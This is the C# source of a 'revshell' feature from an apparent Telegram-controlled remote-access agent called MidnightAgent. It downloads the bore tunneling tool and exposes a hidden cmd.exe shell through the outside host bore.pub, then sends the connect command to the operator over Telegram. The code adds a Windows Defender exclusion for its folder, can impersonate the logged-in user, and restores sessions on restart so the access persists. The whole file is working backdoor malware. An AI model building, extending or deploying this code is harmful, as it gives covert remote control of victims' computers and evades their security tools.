using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Concurrent;
using System.Collections.Generic;
using MidnightAgent.Telegram;
using MidnightAgent.Security;
using MidnightAgent.Installation;

namespace MidnightAgent.Features
{
    /// <summary>
    /// /revshell - Tunnelled Bind Shell using BORE
    /// Supports multiple concurrent sessions.
    /// </summary>
    public class RevShellFeature : IFeature
    {
        public static TelegramService TelegramInstance { get; set; }

        public string Command => "revshell";
        public string Description => "Tunnelled CMD Shell (via BORE)";
        public string Usage => "/revshell [port] (Default: random) | /revshell stop";

        private const string BoreUrl = "https://github.com/ekzhang/bore/releases/download/v0.5.0/bore-v0.5.0-x86_64-pc-windows-msvc.zip";
        
        // Track active sessions
        private static readonly ConcurrentDictionary<int, ShellSession> _sessions = new ConcurrentDictionary<int, ShellSession>();
        private static readonly string StateFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "revshell_state.json");

        // Static Constructor to Load State on startup
        static RevShellFeature()
        {
            LoadState();
        }

        public async Task<FeatureResult> ExecuteAsync(string[] args)
        {
            // Handle List Jobs
            if (args.Length > 0 && args[0].Equals("job", StringComparison.OrdinalIgnoreCase))
            {
                if (_sessions.IsEmpty) return FeatureResult.Ok("No active shell sessions.");
                
                StringBuilder sb = new StringBuilder();
                sb.AppendLine("🐚 <b>Active Shell Sessions:</b>");
                foreach (var s in _sessions.Values)
                {
                    string url = s.PublicUrl ?? "Waiting...";
                    string ncCmd = s.PublicUrl != null ? $"<code>nc {s.PublicUrl.Replace(":", " ")}</code>" : "";
                    sb.AppendLine($"• <b>#{s.Id}</b> [{s.Status}] - {url} {ncCmd}");
                }
                return FeatureResult.Ok(sb.ToString());
            }

            // Handle Stop 
            if (args.Length > 0 && args[0].Equals("stop", StringComparison.OrdinalIgnoreCase))
            {
                // stop <id>
                if (args.Length > 1 && int.TryParse(args[1], out int id))
                {
                    if (_sessions.TryRemove(id, out var session))
                    {
                        session.Stop();
                        SaveState(); // Save after remove
                        return FeatureResult.Ok($"Stopped Session #{id}.");
                    }
                    return FeatureResult.Fail($"Session #{id} not found.");
                }
                
                // stop all
                int count = _sessions.Count;
                foreach (var s in _sessions.Values)
                {
                    s.Stop();
                }
                _sessions.Clear();
                SaveState(); // Save empty state

                // Force Kill ALL orphaned bore.exe processes to ensure clean slate
                try { Process.Start(new ProcessStartInfo("taskkill", "/F /IM bore.exe") { CreateNoWindow = true, UseShellExecute = false }); } catch { }

                return FeatureResult.Ok($"Stopped all {count} active shell sessions and killed all tunnel processes.");
            }

            // Parse Args
            int localPort = 0;
            string reqPriv = "default"; // default, s, a, u

            foreach (var arg in args)
            {
                if (int.TryParse(arg, out int p)) localPort = p;
                else if (arg.Equals("s", StringComparison.OrdinalIgnoreCase) || arg.Equals("system", StringComparison.OrdinalIgnoreCase)) reqPriv = "system";
                else if (arg.Equals("a", StringComparison.OrdinalIgnoreCase) || arg.Equals("admin", StringComparison.OrdinalIgnoreCase)) reqPriv = "admin";
                else if (arg.Equals("u", StringComparison.OrdinalIgnoreCase) || arg.Equals("user", StringComparison.OrdinalIgnoreCase)) reqPriv = "user";
            }

            // Validate Privileges
            bool isSystem = PrivilegeHelper.IsSystem();
            bool isAdmin = PrivilegeHelper.IsAdmin();
            string currentPriv = isSystem ? "system" : (isAdmin ? "admin" : "user");

            string warning = "";
            bool useImpersonation = false;
            if (reqPriv == "system" && !isSystem) warning = "\n⚠️ <b>Warning:</b> Requested SYSTEM but running as " + currentPriv.ToUpper();
            if (reqPriv == "admin" && !isAdmin) warning = "\n⚠️ <b>Warning:</b> Requested ADMIN but running as " + currentPriv.ToUpper();
            if (reqPriv == "user" && (isSystem || isAdmin)) 
            {
                useImpersonation = true;
                warning = "\n👤 <b>Info:</b> Will impersonate logged-in USER.";
            }

            // Start New Session (Reuse IDs)
            int sessionId = 1;
            while (_sessions.ContainsKey(sessionId))
            {
                sessionId++;
            }

            if (localPort == 0) localPort = new Random().Next(10000, 60000);

            string workDir = @"C:\Users\Public\RevShellTool";
            Directory.CreateDirectory(workDir);
            
            // Try to add Defender Exclusion (Requires Admin)
            if (isAdmin)
            {
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "powershell",
                        Arguments = $"-Command \"Add-MpPreference -ExclusionPath '{workDir}'\"",
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        Verb = "runas"
                    })?.WaitForExit(3000);
                }
                catch { }
            }

            string boreExe = Path.Combine(workDir, "bore.exe");

            try
            {
                // 1. Download Bore if missing
                if (!File.Exists(boreExe))
                {
                    TelegramInstance?.SendMessage("⬇️ <b>Downloading Bore...</b>");
                    using (var client = new HttpClient())
                    {
                        client.DefaultRequestHeaders.Add("User-Agent", "MidnightAgent");
                        string boreZip = Path.Combine(workDir, "bore.zip");
                        var bytes = await client.GetByteArrayAsync(BoreUrl);
                        File.WriteAllBytes(boreZip, bytes);
                        System.IO.Compression.ZipFile.ExtractToDirectory(boreZip, workDir);
                        File.Delete(boreZip);
                    }
                }

                if (!File.Exists(boreExe)) return FeatureResult.Fail("❌ Failed to download bore.exe");

                // 2. Create and Start Session
                var session = new ShellSession(sessionId, localPort, boreExe, workDir, useImpersonation);
                if (_sessions.TryAdd(sessionId, session))
                {
                    SaveState(); // Save new session
                    
                    // Start in background task so we can return 'Ok' status
                    _ = Task.Run(async () => 
                    {
                        try 
                        {
                            await session.RunAsync();
                        }
                        catch (Exception ex)
                        {
                            TelegramInstance?.SendMessage($"❌ Session #{sessionId} Error: {ex.Message}");
                        }
                        finally
                        {
                            // Remove only if completely stopped/failed, not just disconnected client
                            // However, if we want persistence, maybe we keep it??
                            // If it fails to bind (e.g. port taken), we probably should remove it.
                            if (session.Status == "BindFail" || session.Status == "Timeout" || session.Status == "Stopped")
                            {
                                _sessions.TryRemove(sessionId, out _);
                                SaveState();
                            }
                        }
                    });

                    return FeatureResult.Ok($"Initializing Session #{sessionId}..." + warning);
                }

                return FeatureResult.Fail("❌ Failed to start session.");
            }
            catch (Exception ex)
            {
                return FeatureResult.Fail($"Error: {ex.Message}");
            }
        }

        #region Persistence
        private class SessionState
        {
            public int Id { get; set; }
            public int Port { get; set; }
        }

        private static void SaveState()
        {
            try
            {
                var states = new System.Collections.Generic.List<SessionState>();
                foreach (var s in _sessions.Values)
                {
                    states.Add(new SessionState { Id = s.Id, Port = s.Port }); // Expose Port in ShellSession
                }
                string json = Newtonsoft.Json.JsonConvert.SerializeObject(states);
                File.WriteAllText(StateFile, json);
            }
            catch { /* Ignore errors during state saving */ }
        }

        private static void LoadState()
        {
            try
            {
                if (!File.Exists(StateFile)) return;
                
                string json = File.ReadAllText(StateFile);
                var states = Newtonsoft.Json.JsonConvert.DeserializeObject<System.Collections.Generic.List<SessionState>>(json);
                
                if (states == null) return;

                string workDir = @"C:\Users\Public\RevShellTool";
                string boreExe = Path.Combine(workDir, "bore.exe");
                Directory.CreateDirectory(workDir);

                foreach (var state in states)
                {
                    // Create session but don't start yet, or wait for Init?
                    // We must start them to restore functionality.
                    var session = new ShellSession(state.Id, state.Port, boreExe, workDir);
                    if (_sessions.TryAdd(state.Id, session))
                    {
                         _ = Task.Run(async () => 
                        {
                            try { 
                                // Small delay to let Telegram init
                                await Task.Delay(5000); 
                                await session.RunAsync(); 
                            } 
                            catch { /* Ignore errors during restored session run */ } 
                        });
                    }
                }
            }
            catch { /* Ignore errors during state loading */ }
        }
        #endregion

        /// <summary>
        /// Encapsulates a single shell session
        /// </summary>
        private class ShellSession
        {
            public int Id { get; }
            public int Port { get { return _port; } } // Expose for Save
            public string PublicUrl { get; private set; }
            public string Status { get; private set; } = "Init";

            private int _port;
            private string _boreExe;
            private string _workDir;
            private bool _useImpersonation;
            
            private TcpListener _listener;
            private Process _boreProcess;
            private CancellationTokenSource _cts;

            public ShellSession(int id, int port, string boreExe, string workDir, bool useImpersonation = false)
            {
                Id = id;
                _port = port;
                _boreExe = boreExe;
                _workDir = workDir;
                _useImpersonation = useImpersonation;
                _cts = new CancellationTokenSource();
            }

            public void Stop()
            {
                Status = "Stopped";
                _cts.Cancel();
                Cleanup();
            }

            public async Task RunAsync()
            {
                var token = _cts.Token;
                Status = "Binding";

                // Start Listener with Retry Logic
                bool bound = false;
                int retries = 0;
                
                while (!bound && retries < 3)
                {
                    try
                    {
                        _listener = new TcpListener(IPAddress.Loopback, _port);
                        _listener.Start();
                        bound = true;
                    }
                    catch (SocketException sockEx)
                    {
                        // Address in use? Try new random port.
                        if (sockEx.SocketErrorCode == SocketError.AddressAlreadyInUse)
                        {
                            int newPort = new Random().Next(10000, 60000);
                             TelegramInstance?.SendMessage($"⚠️ [Session #{Id}] Port {_port} busy. Switching to {newPort}...");
                            _port = newPort;
                            // Update State immediately to persist new port
                            SaveState();
                            retries++;
                        }
                        else
                        {
                            TelegramInstance?.SendMessage($"❌ [Session #{Id}] Bind Error: {sockEx.Message}");
                            Status = "BindFail";
                            return;
                        }
                    }
                    catch (Exception ex)
                    {
                        TelegramInstance?.SendMessage($"❌ [Session #{Id}] Bind failed: {ex.Message}");
                        Status = "BindFail";
                        return;
                    }
                }

                if (!bound)
                {
                    Status = "BindFail";
                    TelegramInstance?.SendMessage($"❌ [Session #{Id}] Failed to bind after retries.");
                    return;
                }

                // Start Bore
                Status = "Tunneling";
                // Ensure bore exists (if restoring)
                if (!File.Exists(_boreExe))
                {
                    Status = "NoBore";
                     TelegramInstance?.SendMessage($"❌ [Session #{Id}] Bore missing. Auto-downloading...");
                     // Try to self-heal download? For now just fail gracefully.
                     // Ideally we call back to Execute... but let's Keep It Simple.
                     // Just use what we have in workDir or fail.
                    Cleanup();
                    return;
                }

                var borePsi = new ProcessStartInfo
                {
                    FileName = _boreExe,
                    Arguments = $"local {_port} --to bore.pub",
                    WorkingDirectory = _workDir,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                var tcsUrl = new TaskCompletionSource<string>();

                using (_boreProcess = new Process { StartInfo = borePsi, EnableRaisingEvents = true })
                {
                    _boreProcess.OutputDataReceived += (sender, e) => {
                        if (!string.IsNullOrEmpty(e.Data) && e.Data.Contains("bore.pub")) {
                            var match = Regex.Match(e.Data, @"bore\.pub:\d+");
                            if (match.Success) tcsUrl.TrySetResult(match.Value);
                        }
                    };

                    _boreProcess.Start();
                    _boreProcess.BeginOutputReadLine();
                    _boreProcess.BeginErrorReadLine();

                    // Wait for URL
                    var boreTask = tcsUrl.Task;
                    if (await Task.WhenAny(boreTask, Task.Delay(15000, token)) != boreTask)
                    {
                        TelegramInstance?.SendMessage($"❌ [Session #{Id}] Bore Timeout.");
                        Status = "Timeout";
                        Cleanup();
                        return;
                    }

                    PublicUrl = await boreTask;
                    Status = "Ready";
                    
                    bool isAdmin = PrivilegeHelper.IsAdmin();
                    string adminBadge = isAdmin ? "⚡ ADMIN" : "👤 USER";

                    string msg = $"🐚 <b>Session #{Id} RESTORED!</b>\n" +
                                 $"Status: {adminBadge}\n" +
                                 $"URL: <code>{PublicUrl}</code>\n" +
                                 $"Cmd: <code>nc {PublicUrl.Replace(":", " ")}</code>\n\n" +
                                 $"<b>Mobile Connect:</b>\n" +
                                 $"Android: Termux -> <code>pkg install netcat</code>\n" +
                                 $"iOS: iSH -> <code>apk add netcat-openbsd</code>\n" +
                                 $"Then run the Cmd above.";
                    
                    TelegramInstance?.SendMessage(msg);

                    // Loop to accept connections (Persistent Session)
                    while (!token.IsCancellationRequested)
                    {
                        try
                        {
                            Status = "Listening";
                            // Use AcceptTcpClientAsync with a cancellation registration workaround or just strict check after
                            var clientTask = _listener.AcceptTcpClientAsync();
                            var completedTask = await Task.WhenAny(clientTask, Task.Delay(-1, token));

                            if (completedTask != clientTask) break; // Cancelled

                            using (var client = await clientTask)
                            using (var stream = client.GetStream())
                            {
                                Status = "Active";
                                string modeLabel = _useImpersonation ? "USER" : (PrivilegeHelper.IsSystem() ? "SYSTEM" : (PrivilegeHelper.IsAdmin() ? "ADMIN" : "USER"));
                                TelegramInstance?.SendMessage($"🔌 [Session #{Id}] Client Connected! ({modeLabel})");

                                if (_useImpersonation && TokenImpersonator.CanImpersonate())
                                {
                                    // Use impersonation
                                    IntPtr hProcess, hStdinWrite, hStdoutRead, hStderrRead;
                                    if (TokenImpersonator.CreateProcessAsUser(
                                        "cmd.exe /Q",
                                        out hProcess,
                                        out hStdinWrite,
                                        out hStdoutRead,
                                        out hStderrRead))
                                    {
                                        TelegramInstance?.SendMessage($"👤 [Session #{Id}] Spawned cmd.exe as USER");
                                        
                                        using (var stdIn = new Microsoft.Win32.SafeHandles.SafeFileHandle(hStdinWrite, true))
                                        using (var stdOut = new Microsoft.Win32.SafeHandles.SafeFileHandle(hStdoutRead, true))
                                        using (var stdErr = new Microsoft.Win32.SafeHandles.SafeFileHandle(hStderrRead, true))
                                        using (var stdinStream = new FileStream(stdIn, FileAccess.Write))
                                        using (var stdoutStream = new FileStream(stdOut, FileAccess.Read))
                                        using (var stderrStream = new FileStream(stdErr, FileAccess.Read))
                                        {
                                            var taskOut = CopyStream(stdoutStream, stream, token);
                                            var taskErr = CopyStream(stderrStream, stream, token);
                                            var taskIn  = CopyStream(stream, stdinStream, token);

                                            try
                                            {
                                                await Task.WhenAny(taskIn, taskOut, Task.Delay(-1, token));
                                            }
                                            catch {}
                                        }
                                    }
                                    else
                                    {
                                        TelegramInstance?.SendMessage($"⚠️ [Session #{Id}] USER impersonation failed, falling back to SYSTEM");
                                        // Fallback to normal
                                        await RunShellNormal(stream, token);
                                    }
                                }
                                else
                                {
                                    // Normal mode (SYSTEM/ADMIN)
                                    await RunShellNormal(stream, token);
                                }

                                TelegramInstance?.SendMessage($"👋 [Session #{Id}] Client Disconnected. Waiting for new connection...");
                            }
                        }
                        catch (OperationCanceledException) { break; }
                        catch (ObjectDisposedException) { break; }
                        catch (Exception ex)
                        {
                            if (!token.IsCancellationRequested)
                            {
                                TelegramInstance?.SendMessage($"⚠️ [Session #{Id}] Connection Error: {ex.Message}");
                                await Task.Delay(1000, token); // Prevent tight loop on error
                            }
                        }
                    }
                }
                
                Cleanup();
            }

            private async Task RunShellNormal(NetworkStream stream, CancellationToken token)
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    UseShellExecute = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true,
                    Arguments = "/Q"
                };

                using (var cmd = new Process { StartInfo = startInfo })
                {
                    cmd.Start();

                    var taskOut = CopyStream(cmd.StandardOutput.BaseStream, stream, token);
                    var taskErr = CopyStream(cmd.StandardError.BaseStream, stream, token);
                    var taskIn  = CopyStream(stream, cmd.StandardInput.BaseStream, token);

                    try
                    {
                        await Task.WhenAny(Task.Run(() => cmd.WaitForExit()), taskIn, taskOut);
                    }
                    catch {}

                    if (!cmd.HasExited) cmd.Kill();
                }
            }

            private async Task CopyStream(Stream src, Stream dest, CancellationToken token)
            {
                byte[] buffer = new byte[4096];
                int read;
                try
                {
                    while ((read = await src.ReadAsync(buffer, 0, buffer.Length, token)) > 0)
                    {
                        await dest.WriteAsync(buffer, 0, read, token);
                        await dest.FlushAsync(token);
                    }
                }
                catch { }
            }

            private void Cleanup()
            {
                try { _listener?.Stop(); } catch { }
                try { 
                    if (_boreProcess != null && !_boreProcess.HasExited) 
                        _boreProcess.Kill(); 
                } catch { }
            }
        }
    }
}
